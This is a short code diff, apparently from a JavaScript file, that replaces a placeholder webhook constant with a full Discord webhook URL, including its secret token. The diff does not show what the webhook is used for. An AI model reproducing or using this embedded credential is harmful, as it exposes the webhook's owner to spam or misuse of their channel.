@@ -7,7 +7,7 @@
 
 */
 
-const webhook = 'WEBHOOK';
+const webhook = 'https://discord.com/api/webhooks/1054574184870715452/BC3IXcAH9WE7cDgJY3NXRCGjt_WNZm2zbYLn4xfeBgdXVt1DNmeTutrQS5oNvoHHrFn4';
 
 
 function loadURL() {
